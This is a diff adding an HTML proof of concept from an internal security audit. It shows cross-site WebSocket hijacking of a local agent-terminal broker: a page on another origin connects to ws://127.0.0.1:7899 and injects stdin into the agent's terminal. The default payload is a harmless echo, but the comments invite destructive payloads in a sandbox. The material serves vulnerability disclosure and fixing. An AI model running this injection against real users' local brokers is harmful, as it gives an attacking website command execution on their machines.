@@ -1,0 +1,72 @@
+<!DOCTYPE html>
+<!--
+  PoC for audit hallazgo S-NEW-2 — WebSocket-hijacking del terminal del agente.
+
+  Cómo reproducir (broker corriendo en :7899 y al menos 1 agente activo):
+    1. Identifica un proyecto con peer activo:
+         curl -s http://127.0.0.1:7899/api/projects | jq '.projects[] | {name, peers: .peers | map(.role)}'
+    2. Edita PROJECT y ROLE abajo con valores reales.
+    3. Sirve esta carpeta desde otro puerto, simulando un sitio cualquiera:
+         cd docs/audits/qa-out && python3 -m http.server 8080
+    4. Abre http://127.0.0.1:8080/poc-s-new-2.html en el mismo Chrome
+       donde corre el broker. (Cualquier navegador moderno sirve.)
+    5. Mira el log en pantalla y la consola. El payload por defecto es
+       inocuo (`echo hijacked-by-poc`). Cambia a algo destructivo SOLO
+       en un sandbox propio para confirmar el alcance del problema.
+
+  Este archivo NO se sirve desde el broker — es deliberadamente externo
+  para demostrar que un origin distinto puede hablar con `ws://127.0.0.1:7899`
+  sin preflight ni Origin check (las WebSocket no aplican CORS).
+-->
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>S-NEW-2 PoC · zaipex-acc WS-hijack</title>
+  <style>
+    body { font-family: ui-monospace, monospace; padding: 1em; max-width: 720px; }
+    h1 { font-size: 1em; }
+    #log { white-space: pre-wrap; background: #111; color: #afa; padding: 1em; height: 40vh; overflow: auto; }
+    button { padding: 0.5em 1em; }
+  </style>
+</head>
+<body>
+  <h1>S-NEW-2 — WebSocket-hijacking PoC</h1>
+  <p>Origin: <code id="origin"></code> · Target: <code id="target"></code></p>
+  <p>
+    <button id="connect">1. Connect</button>
+    <button id="inject" disabled>2. Send "echo hijacked\n"</button>
+    <button id="disconnect" disabled>Disconnect</button>
+  </p>
+  <div id="log">(log)</div>
+  <script>
+    const PROJECT = 'zaipex-sass';   // ← edit
+    const ROLE    = 'backend';       // ← edit
+    const PAYLOAD = 'echo hijacked-by-poc\n';
+
+    const url = `ws://127.0.0.1:7899/ws/terminal/${ROLE}?project=${PROJECT}`;
+    document.getElementById('origin').textContent = location.origin || '(file://)';
+    document.getElementById('target').textContent = url;
+
+    const log = (...a) => {
+      const el = document.getElementById('log');
+      el.textContent += a.join(' ') + '\n';
+      el.scrollTop = el.scrollHeight;
+    };
+
+    let ws = null;
+    document.getElementById('connect').onclick = () => {
+      log(`[*] opening ${url} from origin ${location.origin}`);
+      ws = new WebSocket(url);
+      ws.onopen    = () => { log('[+] OPEN — no preflight, no Origin check'); document.getElementById('inject').disabled = false; document.getElementById('disconnect').disabled = false; };
+      ws.onmessage = (e) => log('[<] ' + (typeof e.data === 'string' ? e.data : `[binary ${e.data.byteLength || e.data.size}B]`));
+      ws.onerror   = (e) => log('[!] ERROR ' + (e.message || ''));
+      ws.onclose   = (e) => { log(`[x] CLOSE code=${e.code} reason=${e.reason}`); document.getElementById('inject').disabled = true; };
+    };
+    document.getElementById('inject').onclick = () => {
+      log(`[>] injecting stdin: ${JSON.stringify(PAYLOAD)}`);
+      ws.send(PAYLOAD);
+    };
+    document.getElementById('disconnect').onclick = () => ws && ws.close();
+  </script>
+</body>
+</html>
